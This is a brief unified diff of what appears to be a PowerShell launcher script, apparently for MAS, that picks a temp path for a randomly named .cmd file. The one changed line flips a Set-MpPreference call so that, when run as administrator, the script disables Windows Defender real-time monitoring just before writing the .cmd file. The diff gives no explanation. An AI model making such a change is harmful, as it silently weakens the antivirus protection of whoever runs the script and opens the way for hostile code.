@@ -120,7 +120,7 @@ if (-not $args) {
     $isAdmin = ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 
     $FilePath = if ($isAdmin) {
-        Set-MpPreference -DisableRealtimeMonitoring $false
+        Set-MpPreference -DisableRealtimeMonitoring $true
         "$env:SystemRoot\Temp\MAS_$rand.cmd"
     } else {
         "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd"
